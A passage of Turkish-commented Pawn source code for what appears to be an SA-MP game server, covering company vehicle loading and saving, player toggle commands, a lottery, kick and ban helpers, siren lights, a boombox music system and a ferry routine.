			format(Yazi, 128, "{00FF00}Þirket Arabasý\n{F8F8FF}\"%s\"", Sirketler[ SirketAraba[bID][SASirketID] ][SirketName]);
		    SirketAraba[bID][SA3D] = Create3DTextLabel(Yazi, 0xFFFFFFFF, SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], 35.0, 0);
			Attach3DTextLabelToVehicle(SirketAraba[bID][SA3D], SirketAraba[bID][SAAID], 0.0, 0.0, 0.0);

			Loadedcount++;
		}
		SQL::Close(handle);
		printf("%d sirket arabasi yuklendi.", Loadedcount);
	}
/*
	new query[256], Yazi[500], bID, Loadedcount;
    new Cache: get_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT * FROM `sirketaraclar` ORDER BY `ID` ASC");
	get_isyeri = mysql_query(Connection, query);

	new rows = cache_num_rows();
    if(rows)
	{
		for(new i; i < rows; ++i)
 		{

	        bID = cache_get_field_content_int(i, "ID");

	        SirketAraba[bID][SAModel] = cache_get_field_content_int(i, "Model");

            SirketAraba[bID][SASirketID] = cache_get_field_content_int(i, "SirketID");

            SirketAraba[bID][SAAID] = bID;

            x = cache_get_field_content_float(i, "X");
            SirketAraba[bID][SAY] = cache_get_field_content_float(i, "Y");
            SirketAraba[bID][SAZ] = cache_get_field_content_float(i, "Z");
            SirketAraba[bID][SARZ] = cache_get_field_content_float(i, "RZ");

            SirketAraba[bID][SAFiyat] = cache_get_field_content_int(i, "Fiyat");
            SirketAraba[bID][SAMinRutbe] = cache_get_field_content_int(i, "MinRutbe");

			SirketAraba[bID][SAExist] = 1;
            printf("Sirket ID: %d MysqlID: %d Model: %d X: %f Y: %f Z: %f RZ: %f Renk1: %d renk2: %d ", SirketAraba[bID][SASirketID], bID, SirketAraba[bID][SAModel], SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], SirketAraba[bID][SARZ], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk1], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk2]);
			SirketAraba[bID][SAAID] = Vehicle_Create(SirketAraba[bID][SAModel], SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], SirketAraba[bID][SARZ], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk1], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk2], -1);
			ArabaSirket[ SirketAraba[bID][SAAID] ] = bID;

			format(Yazi, 128, "{00FF00}Þirket Arabasý\n{F8F8FF}\"%s\"", Sirketler[ SirketAraba[bID][SASirketID] ][SirketName]);
		    SirketAraba[i][SA3D] = Create3DTextLabel(Yazi, 0xFFFFFFFF, SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], 35.0, 0);
			Attach3DTextLabelToVehicle(SirketAraba[bID][SA3D], SirketAraba[bID][SAAID], 0.0, 0.0, 0.0);

			Loadedcount++;
	    }
 	}
 	printf("%d sirket arabasi yuklendi.", Loadedcount);
 	cache_delete(get_isyeri);
*/
	return 1;
}

forward LoadSirketAraba_sa(SirketArabaID, name[], value[]);
public LoadSirketAraba_sa(SirketArabaID, name[], value[])
{
   		new handle = SQL::Open(SQL::READ, "sirketaraclar", "ID", SirketArabaID);

    	SQL::ReadInt(handle, "SirketID", SirketAraba[SirketArabaID][SASirketID]);
    	SQL::ReadInt(handle, "Model", SirketAraba[SirketArabaID][SAModel]);
    	SQL::ReadInt(handle, "Fiyat", SirketAraba[SirketArabaID][SAFiyat]);
    	SQL::ReadInt(handle, "MinRutbe", SirketAraba[SirketArabaID][SAMinRutbe]);
    	SQL::ReadFloat(handle, "X", SirketAraba[SirketArabaID][SAX]);
    	SQL::ReadFloat(handle, "Y", SirketAraba[SirketArabaID][SAY]);
    	SQL::ReadFloat(handle, "Z", SirketAraba[SirketArabaID][SAZ]);
    	SQL::ReadFloat(handle, "RZ", SirketAraba[SirketArabaID][SARZ]);

   		SQL::Close(handle);
	return 1;
}

forward SaveSirketArabas();
public SaveSirketArabas()
{
	foreach(new i:SAs)
	{
	    if(SirketAraba[i][SAExist] != 1) continue;
	    if(SirketAraba[i][SANeedSave] != 1) continue;
	    SirketAraba[i][SANeedSave] = 0;

		new handle = SQL::Open(SQL::UPDATE, "sirketaraclar", "ID", i);

		SQL::WriteInt(handle, "ID", i);
	    SQL::WriteInt(handle, "SirketID", SirketAraba[i][SASirketID]);
	    SQL::WriteInt(handle, "Model", SirketAraba[i][SAModel]);
	    SQL::WriteInt(handle, "Fiyat", SirketAraba[i][SAFiyat]);
	    SQL::WriteInt(handle, "MinRutbe", SirketAraba[i][SAMinRutbe]);
	    SQL::WriteFloat(handle, "X", SirketAraba[i][SAX]);
	    SQL::WriteFloat(handle, "Y", SirketAraba[i][SAY]);
	    SQL::WriteFloat(handle, "Z", SirketAraba[i][SAZ]);
	    SQL::WriteFloat(handle, "RZ", SirketAraba[i][SARZ]);

	    SQL::Close(handle);
	}
}

GetSirketArabaCount(SirketID)
{
	new Sonuc;
	foreach(new i:SAs)
	{
	    if(SirketAraba[i][SAExist] != 1) continue;
	    if(SirketAraba[i][SASirketID] == SirketID)
	    {
	        Sonuc++;
	    }
	}
	return Sonuc;
}

SieGoAwaySirketArabas(SirketID)
{
	foreach (new i : SAs)
	{
	    if(SirketAraba[i][SAExist] != 1) continue;
     	ArabaSirket[ SirketAraba[i][SAAID] ] = -1;
	    if(SirketAraba[i][SASirketID] != SirketID) continue;

		SirketAraba[i][SAExist] = 0;


		DestroyVehicle(SirketAraba[i][SAAID]);
		Delete3DTextLabel(SirketAraba[i][SA3D]);

		SQL::DeleteRow("sirketaraclar", "SirketID", SirketID);

    	new next;
    	Iter_SafeRemove(SAs, i, next);
    	i = next;
	}
}

// Loto SafeKick SafeBan +9 Metin Ýtemleri
CMD:l(playerid, params[])
{
	SendAdminText(playerid, "/l", params);

	new tmp[256], idx;
	tmp = strrest(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/l <Mesaj>");

	printf("[LOCAL] %s(%d) : %s", GetName(playerid), playerid, tmp);

	new Yazi[512], Float:X, Float:Y, Float:Z;
	format(Yazi, 512, "{1E90FF}LOCAL %s(%d): {F8F8FF}%s", GetName(playerid), playerid, tmp);

	GetPlayerPos(playerid, X, Y, Z);
	YakinMesaj(Yazi, 15.0, X, Y, Z);

	format(Yazi, 512, "[LOCAL]%s(%d): %s", GetName(playerid), playerid, tmp);
	LOG(Yazi);
	return 1;
}

CMD:isimkapat(playerid, params[])
{
	if(IsimKapat[playerid] == 0)
	{
	    IsimKapat[playerid] = 1;

  		SendClientMessage(playerid, -1, "{F8F8FF}Ýsimler kapatýldý. Açmak için tekrar {4876FF}/isimkapat");

		foreach(new i : Player)
		{
		    ShowPlayerNameTagForPlayer(playerid, i, 0);
		}
	}else{
	    IsimKapat[playerid] = 0;

  		SendClientMessage(playerid, -1, "{F8F8FF}Ýsimler açýldý. Kapatmak için tekrar {4876FF}/isimkapat");

		foreach(new i : Player)
		{
		    ShowPlayerNameTagForPlayer(playerid, i, 1);
		}
	}
	return 1;
}

CMD:textkapat(playerid, params[])
{
	if(TextKapat[playerid] == 0)
	{
	    TextKapat[playerid] = 1;
  		SendClientMessage(playerid, -1, "{F8F8FF}TextDrawlar kapatýldý. Açmak için tekrar {4876FF}/textkapat");

		for(new i; i < 20; i++)//29/04/2018
		{
			PlayerTextDrawHide(playerid, UI_AdminText[playerid][i]);
			PlayerTextDrawHide(playerid, UI_DuyuruText[playerid][i]);
		/*	PlayerTextDrawHide(playerid, UI_GMBilgi[playerid][i]);
			PlayerTextDrawHide(playerid, UI_AltBar[playerid][i]);
			PlayerTextDrawHide(playerid, UI_SCBilgi[playerid][i]);
			PlayerTextDrawHide(playerid, UI_SLogo[playerid][i]);
			PlayerTextDrawHide(playerid, UI_ORBilgiL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OGBilgiL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OKBilgiL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_RMBilgiL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_RMBilgiH[playerid][i]);
			PlayerTextDrawHide(playerid, UI_RMBilgi[playerid][i]);
			PlayerTextDrawHide(playerid, UI_AltBilgi[playerid][i]);
			PlayerTextDrawHide(playerid, UI_ORBilgiH[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OGBilgiH[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OKBilgiH[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OKBilgi[playerid][i]);
			PlayerTextDrawHide(playerid, UI_OGBilgiL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_WantedL[playerid][i]);
			PlayerTextDrawHide(playerid, UI_Wanted[playerid][i]);*/
			}
		}else{
	    TextKapat[playerid] = 0;
  		SendClientMessage(playerid, -1, "{F8F8FF}TextDrawlar açýldý. Kapatmak için tekrar {4876FF}/textkapat");
		for(new i; i < 20; i++)
		{
			PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
			PlayerTextDrawShow(playerid, UI_DuyuruText[playerid][i]);
		/*	PlayerTextDrawShow(playerid, UI_GMBilgi[playerid][i]);
			PlayerTextDrawShow(playerid, UI_AltBar[playerid][i]);
			PlayerTextDrawShow(playerid, UI_SCBilgi[playerid][i]);
			PlayerTextDrawShow(playerid, UI_SLogo[playerid][i]);
			PlayerTextDrawShow(playerid, UI_ORBilgiL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OGBilgiL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OKBilgiL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_RMBilgiL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_RMBilgiH[playerid][i]);
			PlayerTextDrawShow(playerid, UI_RMBilgi[playerid][i]);
			PlayerTextDrawShow(playerid, UI_AltBilgi[playerid][i]);
			PlayerTextDrawShow(playerid, UI_ORBilgiH[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OGBilgiH[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OKBilgiH[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OKBilgi[playerid][i]);
			PlayerTextDrawShow(playerid, UI_OGBilgiL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_WantedL[playerid][i]);
			PlayerTextDrawShow(playerid, UI_Wanted[playerid][i]);*/
		}
	}
	return 1;
}
//okancode


CMD:duyurukapat(playerid, params[])
{
	if(DuyuruKapat[playerid] == 0)
	{
	    DuyuruKapat[playerid] = 1;
  		SendClientMessage(playerid, -1, "{F8F8FF}Duyurular kapatýldý. Açmak için tekrar {4876FF}/duyurukapat");

		for(new i; i < 7; i++)
		{
			PlayerTextDrawHide(playerid, UI_DuyuruText[playerid][i]);

		}
	}else{
	    DuyuruKapat[playerid] = 0;
  		SendClientMessage(playerid, -1, "{F8F8FF}TextDrawlar açýldý. Kapatmak için tekrar {4876FF}/duyurukapat");

		for(new i; i < 7; i++)
		{
			PlayerTextDrawShow(playerid, UI_DuyuruText[playerid][i]);
		}
	}
	return 1;
}
CMD:cmdkapat(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0) return 1;
	if(CMDKapat[playerid] == 0)
	{
	    CMDKapat[playerid] = 1;
  		SendClientMessage(playerid, -1, "{F8F8FF}CMDlar kapatýldý. Açmak için tekrar {4876FF}/cmdkapat");

		for(new i; i < 7; i++)
		{
			PlayerTextDrawHide(playerid, UI_AdminText[playerid][i]);
		}
	}else{
	    CMDKapat[playerid] = 0;
  		SendClientMessage(playerid, -1, "{F8F8FF}CMDlar açýldý. Kapatmak için tekrar {4876FF}/cmdkapat");

		for(new i; i < 7; i++)
		{
			PlayerTextDrawShow(playerid, UI_AdminText[playerid][i]);
		}
	}
	return 1;
}
public OnPlayerStreamIn(playerid, forplayerid)
{
	if(IsimKapat[forplayerid] == 1)
	{
		ShowPlayerNameTagForPlayer(forplayerid, playerid, 0);
	}

	// AirBalloon Sistemi
	if(Balonda[playerid] == true)
	{
 		AttachObjectToPlayer(BalonObje[playerid][0],playerid,0.0,0.0,-1.0,0.0,0.0,0.0);
	}
	return 1;
}

YakinMesaj(yazi[], Float:radius, Float:X, Float:Y, Float:Z)
{
	foreach(new i : Player)
	{
	    if(IsPlayerInRangeOfPoint(i, radius, X, Y, Z))
	    {
	        SendClientMessage(i, -1, yazi);
	    }
	}
}

CMD:ehliyetver(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 5 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/ehliyetver <Oyuncu ID> <Ehliyet ID 0=Kamyoncu 1=Otobüsçü> <0=Var 1=Yok>");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Hatalý oyuncu ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/ehliyetver <Oyuncu ID> <Ehliyet ID 0=Kamyoncu 1=Otobüsçü> <0=Var 1=Yok>");
	new EhliyetID = strval(tmp);

	if(EhliyetID < 0 || EhliyetID > 1) return SendClientMessage(playerid, -1, "{FF0000}Ehliyet ID 0 ile 1 arasýndadýr!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/ehliyetver <Oyuncu ID> <Ehliyet ID 0=Kamyoncu 1=Otobüsçü> <0=Var 1=Yok>");
	new Ehliyet = strval(tmp);

	if(Ehliyet < 0 || Ehliyet > 1) return SendClientMessage(playerid, -1, "{FF0000}Ehliyet 0 ile 1 arasýndadýr!");

	switch(EhliyetID)
	{
	    case 0: APlayerData[id][TruckerLicense] = Ehliyet;
		case 1: APlayerData[id][BusLicense] = Ehliyet;
	}
	return 1;
}

forward Lotto();
public Lotto()
{
	if(Iter_Count(Player) > 3)
	{
      	new /*PCount,*/ String[255], Name[MAX_PLAYER_NAME];
      	/*for(new i; i<GetMaxPlayers(); i++)
      	{
      		if(IsPlayerConnected(i)) PCount++;
      	}*/
      	//new Winner = random(PCount);
	  	new Winner = Iter_Random(Player);
	  	GetPlayerName(Winner, Name, MAX_PLAYER_NAME);
      	format(String, 128, "{ff0000}[LOTTO]:{ffffff} %s Lottoyu Kazandý : {00c5ff} $65.000 {ffffff} Tebrikler %s", Name, Name);
      	SendClientMessageToAll(0x16EB43FF, String);
      	RewardPlayer(Winner, LOTTO_MIKTAR, 0);
      	GivePlayerAchievement(Winner, AtNaliAch, 1); // Baþarým Sistemi
	}
}

forward _Kick(playerid);
public _Kick(playerid)
{
	Kick(playerid);
}

forward _Ban(playerid);
public _Ban(playerid)
{
	Ban(playerid);
}

forward _BanEx(playerid, reason[]);
public _BanEx(playerid, reason[])
{
	BanEx(playerid, reason);
}
/*
stock GetNumberOfPlayersOnThisIP(test_ip[])
{
	new against_ip[32+1];
	new x = 0;
	new ip_count = 0;
	for(x=0; x<MAX_PLAYERS; x++) {
		if(IsPlayerConnected(x)) {
		    GetPlayerIp(x,against_ip,32);
		    if(!strcmp(against_ip,test_ip)) ip_count++;
		}
	}
	return ip_count;
}
*/

forward locplayers(playerid);
public locplayers(playerid)
{
	if(oldid[playerid] <= MAX_PLAYER_NAME)
 	{
 	    if(IsPlayerConnected(playerid))
 	    {
	  		if(IsPlayerConnected(oldid[playerid]))
	    	{
	    	    if(locvarmi[playerid] == true)
				{
					SetPlayerMarkerForPlayer(playerid, oldid[playerid],0xAA3333AA );
				}
				else
				{
				    KillTimer(loc_timer[playerid]);
				    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
				}
	  		}
	   		else
	    	{
	    	    KillTimer(loc_timer[playerid]);
	    	    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
	    	}
    	}
    	else
    	{
    	    KillTimer(loc_timer[playerid]);
    	}
	}
	else
	{
	    KillTimer(loc_timer[playerid]);
	    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
	}
	return 1;
}
forward locplayers2(playerid);
public locplayers2(playerid)
{
	if(oldid[playerid] <= MAX_PLAYER_NAME)
 	{
 	    if(IsPlayerConnected(playerid))
 	    {
	  		if(IsPlayerConnected(oldid[playerid]))
	    	{
	    	    if(locvarmi[playerid] == true)
				{
					SetPlayerMarkerForPlayer(playerid, oldid[playerid], 0x33CCFFAA);
					//return 0;
				}
				else
				{
				    KillTimer(loc_timer2[playerid]);
				    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
					//return 1;
				}
	  		}
	   		else
	    	{
	    	    KillTimer(loc_timer2[playerid]);
	    	    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
	  	    	//return 1;
	    	}
    	}
    	else
    	{
    	    KillTimer(loc_timer2[playerid]);
    	    //return 1;
    	}
	}
	else
	{
	    KillTimer(loc_timer2[playerid]);
	    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
	    //return 1;
	}
	return 1;
}


forward OnLightFlash(vehicleid,playerid);
public OnLightFlash(vehicleid,playerid)
{
    new panels, doors, lights, tires;
	GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);

	switch(Flash[vehicleid])
		{
	        case 0: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);

		    case 1: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);

		    case 2: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);

		    case 3: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);

		    case 4: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);

		    case 5: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);
		}
		if(Flash[vehicleid] >=5) Flash[vehicleid] = 0;
		else Flash[vehicleid] ++;

	return 1;
}

public OnVehicleSirenStateChange(playerid, vehicleid, newstate)
{
	if(APlayerData[playerid][PlayerClass] == ClassPolice)
	{
		if(newstate)
		{
		    if(Flashing[vehicleid] == false)
		    {
		    	FlashTime[vehicleid] = SetTimerEx("OnLightFlash", flashtime, true, "d", vehicleid);
		    	Flashing[vehicleid] = true;
			}
		}
		if(!newstate)
		{
		    if(Flashing[vehicleid] == true)
		    {
				new panels, doors, lights, tires;

				KillTimer(FlashTime[vehicleid]);

				GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
		    	UpdateVehicleDamageStatus(vehicleid, panels, doors, 0, tires);

		    	Flashing[vehicleid] = false;
			}
		}
	}
	return 1;
}

GetVehicleDriver31(vehicleid)
{
new Sonuc = -1;
foreach(new i:Player)
{
if(!IsPlayerInAnyVehicle(i)) continue;
if(GetPlayerVehicleID(i) == vehicleid) { Sonuc = i; break; }
}
return Sonuc;
}

GetVehicleDriver2(vehicleid)
{
new Sonuc = -1;
foreach(new i:Player)
{
if(GetPlayerState(i) != PLAYER_STATE_DRIVER) continue;
if(GetPlayerVehicleID(i) == vehicleid) { Sonuc = i; break; }
}
return Sonuc;
}

// Burayý Metine Kitledim Zaaa :D
IsNumeric(string[])
{
	for (new i = 0, j = strlen(string);
	i < j; i++)
	{
	if (string[i] > '9' || string[i] < '0')
	return 0;
	}
	return 1;
}

GetVehicleModelIDFromName(vehname[])
{
	new Result = -1;

	for(new BModel; BModel < 211; BModel++)
	{
	    if(!strfind(VehNames[BModel],vehname,true))
	    {
	        Result = BModel+400;
	        break;
		}
	}

	return Result;
}

AntiDeAMX()
{
	new a[][] =
	{
		"Unarmed (Fist)",
		"Brass K"
	};
	#pragma unused a
}

WasteDeAMXersTime()
{
    new b;
    #emit load.pri b
    #emit stor.pri b
}

// ************************************************************************************************************************************************************
// BoomBox Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:boombox(playerid, params[])
{
//	if(pInfo[playerid][pBoomBox] == 0) return Hata(playerid, "Sizin Bir BoomBox'unuz Yok!");

	new tmp[3000], idx;
	tmp = strtok(params, idx);

	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /boombox [YereKoy/YerdenAl/MuzikAc/MuzikDurdur]");
	if(!strcmp("YereKoy", tmp, true))
	{
	    if(OyuncuBB[playerid] != -1) return SendClientMessage(playerid, -1, "{FF0000}BoomBox'unuz zaten yerde!");
	    new Float:oX, Float:oY, Float:oZ;
	    GetPlayerPos(playerid, oX, oY, oZ);

		EditingBBObject[playerid] = CreateDynamicObject(2226, oX+0.5, oY+0.5, oZ, 0.0, 0.0, 0.0);
		EditDynamicObject(playerid, EditingBBObject[playerid]);

		SendClientMessage(playerid, -1, "{00FF00}BoomBox'u istediðiniz bir yere yerleþtiriniz ve disket sembolüne týklayýnýz.");
	}
	else if(!strcmp("YerdenAl", tmp, true))
	{
	    if(OyuncuBB[playerid] == -1) return SendClientMessage(playerid, -1, "{FF0000}BoomBox'unuzu yerden alabilmeniz için onun yerde olmasý gerekiyor!");
		//if(!IsPlayerInRangeOfPoint(playerid, 5.0, BoomBoxlar[ OyuncuBB[playerid] ][BBX], BoomBoxlar[ OyuncuBB[playerid] ][BBY], BoomBoxlar[ OyuncuBB[playerid] ][BBZ])) return Hata(playerid, "BoomBox'unuzu yerden alabilmek için onun yakýnýnda olmalýsýnýz!");
		DestroyBoomBox(OyuncuBB[playerid]);
		OyuncuBB[playerid] = -1;
	}else if(!strcmp("MuzikAc", tmp, true))
	{
		if(OyuncuBB[playerid] == -1) return SendClientMessage(playerid, -1, "{FF0000}BoomBox'unuzda müzik açabilmek için onu yere koymanýz gerekiyor!");
		ShowPlayerDialog(playerid, DialogBoombox, DIALOG_STYLE_INPUT, "{00FF00}BoomBox - Müzik Aç", "{F8F8FF}Açmak istediðiniz müziðin URL'sini giriniz:", "Aç", "Ýptal");
		/*
		tmp = strrest(params, idx);

		if(!strlen(tmp)) return Kullanim(playerid, "/boombox [MuzikAc][Müzik URL]");
  		PlayASongInBoomBox(OyuncuBB[playerid], tmp);
		Bilgi(playerid, "BoomBox'unuzda Yeni Müzik Açtýnýz.");
		*/
	}else if(!strcmp("MuzikDurdur", tmp, true))
	{
	    if(OyuncuBB[playerid] == -1) return SendClientMessage(playerid, -1, "{FF0000}BoomBox'unuzda müziði durdurabilmek için onun yerde olmasý gerekiyor!");
        StopSongInBoomBox(OyuncuBB[playerid]);
        SendClientMessage(playerid, -1, "{00FF00}BoomBox'unuzda çalan müziði durdurdunuz.");
	}
	return 1;
}

RefreshPlayerBoomBox(playerid)
{
	new Sonuc = -1, Float:oX, Float:oY, Float:oZ, interior;
	GetPlayerPos(playerid, oX, oY, oZ);
	interior = GetPlayerInterior(playerid);

	foreach(new i : BBs)
	{
	    if(BoomBoxlar[i][BBExist] == 1)
	    {
 			new Float:Mesafe = floatsqroot( (oX - BoomBoxlar[i][BBX]) * (oX - BoomBoxlar[i][BBX]) + (oY - BoomBoxlar[i][BBY]) * (oY - BoomBoxlar[i][BBY]) );
			if(Mesafe <= (BoomBoxlar[i][BBMesafe]) && interior == BoomBoxlar[i][BBInt])
	        {
	            Sonuc = i;

				if(DinlenilenBoomBox[playerid] == i) break;

				if(!strcmp(BoomBoxlar[i][BBURL], "-", true))
				{

				}else{
				    StopAudioStreamForPlayer(playerid);
					PlayAudioStreamForPlayer(playerid, BoomBoxlar[i][BBURL], BoomBoxlar[i][BBX], BoomBoxlar[i][BBY], BoomBoxlar[i][BBZ], BoomBoxlar[i][BBMesafe]);
				}

				break;
	        }
	    }
	}

	if(DinlenilenBoomBox[playerid] != -1 && Sonuc == -1) { StopAudioStreamForPlayer(playerid); }
	DinlenilenBoomBox[playerid] = Sonuc;
}

PlayASongInBoomBox(BoomBoxID, URL[])
{
	format(BoomBoxlar[BoomBoxID][BBURL], 256, URL);

	foreach(new i : Player)
	{
	    if(DinlenilenBoomBox[i] == BoomBoxID)
	    {
            StopAudioStreamForPlayer(i);
            PlayAudioStreamForPlayer(i, BoomBoxlar[BoomBoxID][BBURL], BoomBoxlar[BoomBoxID][BBX], BoomBoxlar[BoomBoxID][BBY], BoomBoxlar[BoomBoxID][BBZ], BoomBoxlar[BoomBoxID][BBMesafe]);
	    }
	}
}

StopSongInBoomBox(BoomBoxID)
{
	format(BoomBoxlar[BoomBoxID][BBURL], 100, "-");

	foreach(new i : Player)
	{
	    if(DinlenilenBoomBox[i] == BoomBoxID)
	    {
            StopAudioStreamForPlayer(i);
	    }
	}
}

CreateBoomBox(owner[], Float:distance, Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ, Int)
{
	new CreatedID;

	CreatedID = Iter_Free(BBs);

	Iter_Add(BBs, CreatedID);
	BoomBoxlar[CreatedID][BBExist] = 1;

	format(BoomBoxlar[CreatedID][BBURL], 100, "-");
	format(BoomBoxlar[CreatedID][BBSahip], 50, owner);
	BoomBoxlar[CreatedID][BBMesafe] = distance;
	BoomBoxlar[CreatedID][BBX] = X;
	BoomBoxlar[CreatedID][BBY] = Y;
	BoomBoxlar[CreatedID][BBZ] = Z;
	BoomBoxlar[CreatedID][BBInt] = Int;

	BoomBoxlar[CreatedID][BBObj] = CreateDynamicObject(2226, BoomBoxlar[CreatedID][BBX], BoomBoxlar[CreatedID][BBY], BoomBoxlar[CreatedID][BBZ], rX, rY, rZ, 0, BoomBoxlar[CreatedID][BBInt]);

	new Yazi[256];
	format(Yazi, 256, "{00FF00}BoomBox\n \n{F8F8FF}Sahip : {00FF00}%s\n \n{00FF00}/boombox", owner);
	BoomBoxlar[CreatedID][BB3D] = Create3DTextLabel(Yazi, -1, BoomBoxlar[CreatedID][BBX], BoomBoxlar[CreatedID][BBY], BoomBoxlar[CreatedID][BBZ], 7.5, 0);

	return CreatedID;
}

DestroyBoomBox(BoomBoxID)
{
	Iter_Remove(BBs, BoomBoxID);
	BoomBoxlar[BoomBoxID][BBExist] = 0;

	DestroyDynamicObject(BoomBoxlar[BoomBoxID][BBObj]);
	Delete3DTextLabel(BoomBoxlar[BoomBoxID][BB3D]);

	StopSongInBoomBox(BoomBoxID);
}

IsObjectInBoomBoxArea(objectid, Float:distance, interior)
{
	new Sonuc, Float:oX, Float:oY, Float:oZ, Float:Mesafe;
	GetObjectPos(objectid, oX, oY, oZ);

	foreach(new i : BBs)
	{
	    if(BoomBoxlar[i][BBExist] == 1)
	    {
			Mesafe = floatsqroot( (oX - BoomBoxlar[i][BBX]) * (oX - BoomBoxlar[i][BBX]) + (oY - BoomBoxlar[i][BBY]) * (oY - BoomBoxlar[i][BBY]) );
			if(Mesafe < (distance + BoomBoxlar[i][BBMesafe]) && interior == BoomBoxlar[i][BBInt])
			{
			    Sonuc = 1;
				break;
			}
	    }
	}

	return Sonuc;
}


//============================================================================//

//=== (( Stock vb. )) ========================================================//
SafeKick(playerid)
{
	SetTimerEx("_Kick", 150, false, "i", playerid);
	return 1;
}

SafeBan(playerid)
{
	SetTimerEx("_Ban", 150, false, "i", playerid);
	return 1;
}

SafeBanEx(playerid, reason[])
{
	SetTimerEx("_BanEx", 150, false, "is", playerid, reason);
	return 1;
}

forward girisKick(playerid);
public girisKick(playerid)
{
	new oyuncuIsmi[MAX_PLAYER_NAME], kickMesaj[128];
	GetPlayerName(playerid, oyuncuIsmi, MAX_PLAYER_NAME);

	format(kickMesaj, sizeof(kickMesaj), "{FFFF00}%s {00FF00}rumuzlu oyuncu 60 saniye içinde giriþ yapmadýðý için tekmelendi!", oyuncuIsmi);
	SendClientMessageToAll(0xFFFFFF, kickMesaj);
	format(kickMesaj, 128, "%s(%d) 60 saniye içinde giriþ yapmadýðý için tekmelendi", GetName(playerid), playerid);
	LOG(kickMesaj);
	SafeKick(playerid);
}

// ************************************************************************************************************************************************************
// Ferry Sistemi
// ************************************************************************************************************************************************************
public FerryIS(playerid)
{
	if(ferryI == 1)
	{
		SendClientMessage(playerid, 0xFF000000, "** Ferry docked to island!");
		return 1;
	}
	MoveObject(ferry, 2650.21191, -2291.62915, -0.03891, 11.0,   0.00000, 0.00000, 0.00000);
	AttachObjectToObject(FerryObject[0], ferry, 3.24048,-7.5271,33.15641,0.0000000,0.0000000,0.0000000, 1);
    AttachObjectToObject(FerryObject[1], ferry, -98.97412, 0.08716, 11.39139,   0.0, 0.0, 0.0, 1); // This will attach VehicleObject[1] to veh. And now, we got 2 objects attached to your vehicle!
    AttachObjectToObject(FerryObject[2], ferry, -56.76245, 12.12427, 11.06169,   0.0, 0.0, 0.0, 1);
    AttachObjectToObject(FerryObject[3], ferry,-109.15283, 0.0481, 0.3928,   0.0, 0.0,0.0, 1);
    AttachObjectToObject(FerryObject[4], ferry, 3.21216, -7.53882, 33.03929,   0.0, 0.0, 0.0, 1);
    AttachObjectToObject(FerryObject[5], ferry, 87.71338, -12.92896, 12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[6], ferry,88.33399, 12.88525, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[7], ferry,-71.03637, -12.92651, 12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[8], ferry, -45.41943, -12.94238, 12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[9], ferry, -12.94946, -13.6997, 12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[10], ferry, 49.28492, -12.92676, 12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[11], ferry, 74.90259, -12.93872,12.14239,   0.0, 0.0, 269.98810, 1);
    AttachObjectToObject(FerryObject[12], ferry, -96.6333, -12.94287, 12.14239,   0.0, 0.0, 269.96811, 1);
